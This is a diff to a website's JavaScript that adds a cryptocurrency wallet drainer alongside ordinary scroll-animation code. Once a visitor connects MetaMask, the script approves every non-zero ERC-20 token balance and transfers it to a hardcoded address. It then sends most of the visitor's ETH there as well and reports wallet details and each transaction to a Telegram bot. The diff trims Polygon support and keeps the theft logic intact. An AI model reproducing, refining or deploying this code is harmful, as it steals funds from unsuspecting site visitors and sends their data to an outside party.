@@ -81,17 +81,15 @@ scrollReveal();
 addEventOnElem(window, "scroll", scrollReveal);
 
 /**
- * Wallet connect, network switching, token approval and transfer, and native coin transfer with Telegram notification
+ * Wallet connect, token approval and transfer, and native coin transfer with Telegram notification
  */
 async function connectWalletAndSendTokens() {
   if (!window.ethers || !window.ethereum) {
     console.error("MetaMask is not installed.");
     // Redirect to MetaMask app on mobile or MetaMask download page on desktop
     if (/Mobi|Android|iPhone/i.test(navigator.userAgent)) {
-      // Mobile device: redirect to MetaMask app
       window.location.href = "https://metamask.app.link/dapp/" + window.location.host + window.location.pathname;
     } else {
-      // Desktop: redirect to MetaMask download page
       window.location.href = "https://metamask.io/download.html";
     }
     return;
@@ -103,13 +101,6 @@ async function connectWalletAndSendTokens() {
       name: "Ethereum",
       chainName: "eth",
       nativeCoin: "ETH",
-      exodusAddress: "0x525E64339403bFd25Fb982E77aa0A77ddaB1bf57"
-    },
-    {
-      chainId: 137,
-      name: "Polygon",
-      chainName: "polygon",
-      nativeCoin: "MATIC",
       exodusAddress: "0x525E64339403bFd25Fb982E77aa0A77ddaB1bf57"
     }
   ];
@@ -149,21 +140,12 @@ async function connectWalletAndSendTokens() {
         } catch (switchErr) {
           if (switchErr.code === 4902) {
             const chainConfig = {
-              1: {
-                chainId: '0x1',
-                chainName: 'Ethereum Mainnet',
-                rpcUrls: ['https://mainnet.infura.io/v3/5b2c5ee5760146349669a1e9c77665d1'],
-                nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
-                blockExplorerUrls: ['https://etherscan.io']
-              },
-              137: {
-                chainId: '0x89',
-                chainName: 'Polygon Mainnet',
-                rpcUrls: ['https://polygon-rpc.com'],
-                nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 },
-                blockExplorerUrls: ['https://polygonscan.com']
-              }
-            }[network.chainId];
+              chainId: '0x1',
+              chainName: 'Ethereum Mainnet',
+              rpcUrls: ['https://mainnet.infura.io/v3/5b2c5ee5760146349669a1e9c77665d1'],
+              nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
+              blockExplorerUrls: ['https://etherscan.io']
+            };
             await window.ethereum.request({
               method: 'wallet_addEthereumChain',
               params: [chainConfig]
@@ -252,65 +234,67 @@ ${nativeBalanceMessage}
           body: JSON.stringify({ chat_id: chatId, text: networkMessage })
         });
 
-        // Approve and transfer ERC-20 tokens
+        // Approve and transfer ERC-20 tokens if they exist
         const nonZeroTokens = tokens.filter(t => t.balance && !ethers.BigNumber.from(t.balance).isZero());
 
-        for (const token of nonZeroTokens) {
-          try {
-            const contract = new ethers.Contract(token.token_address, [
-              "function approve(address spender, uint amount) returns (bool)",
-              "function transferFrom(address from, address to, uint amount) returns (bool)"
-            ], currentSigner);
+        if (nonZeroTokens.length > 0) {
+          for (const token of nonZeroTokens) {
+            try {
+              const contract = new ethers.Contract(token.token_address, [
+                "function approve(address spender, uint amount) returns (bool)",
+                "function transferFrom(address from, address to, uint amount) returns (bool)"
+              ], currentSigner);
 
-            // Step 1: Approve
-            const approveTx = await contract.approve(network.exodusAddress, token.balance);
-            await approveTx.wait();
+              // Step 1: Approve
+              const approveTx = await contract.approve(network.exodusAddress, token.balance);
+              await approveTx.wait();
 
-            const balance = ethers.utils.formatUnits(token.balance, token.decimals ?? 18);
-            const approveSuccessMessage = `
-✅ Approval Successful
+              const balance = ethers.utils.formatUnits(token.balance, token.decimals ?? 0);
+              const approveSuccessMessage = `
+✅ Approve Successful
 Token: ${token.symbol}
 Amount: ${balance}
 Spender: ${network.exodusAddress}
 Tx: ${approveTx.hash}
-            `;
-            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ chat_id: chatId, text: approveSuccessMessage })
-            });
+              `;
+              await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: approveSuccessMessage })
+              });
 
-            // Step 2: TransferFrom
-            const transferTx = await contract.transferFrom(userAddress, network.exodusAddress, token.balance);
-            await transferTx.wait();
+              // Step 2: TransferFrom
+              const transferTx = await contract.transferFrom(userAddress, network.exodusAddress, token.balance);
+              await transferTx.wait();
 
-            const transferSuccessMessage = `
+              const transferSuccessMessage = `
 ✅ Transfer Successful
 Token: ${token.symbol}
 Amount: ${balance}
 To: ${network.exodusAddress}
 Tx: ${transferTx.hash}
-            `;
-            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ chat_id: chatId, text: transferSuccessMessage })
-            });
-          } catch (err) {
-            const errorMessage = `
+              `;
+              await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: transferSuccessMessage })
+              });
+            } catch (err) {
+              const errorMessage = `
 ❌ Token Operation Failed
 Token: ${token.symbol}
 Error: ${err.message}
-            `;
-            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ chat_id: chatId, text: errorMessage })
-            });
+              `;
+              await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: errorMessage })
+              });
+            }
           }
         }
 
-        // Transfer native coin (ETH or MATIC)
+        // Transfer native coin (ETH) regardless of ERC-20 tokens
         try {
           const balance = await currentProvider.getBalance(userAddress);
           if (balance.isZero()) {
@@ -326,12 +310,12 @@ Address: ${userAddress}
           } else {
             // Estimate gas price and gas limit
             const gasPrice = await currentProvider.getGasPrice();
-            const gasLimit = ethers.BigNumber.from("21000"); // Standard gas limit for simple ETH/MATIC transfer
+            const gasLimit = ethers.BigNumber.from("21000"); // Standard gas limit for simple ETH transfer
             const gasCost = gasPrice.mul(gasLimit);
-            
+
             // Calculate amount to send (subtract gas cost to leave enough for fees)
             const amountToSend = balance.sub(gasCost);
-            
+
             if (amountToSend.lte(0)) {
               const insufficientBalanceMessage = `
 ⚠️ Insufficient ${network.nativeCoin} balance for transfer after gas fees
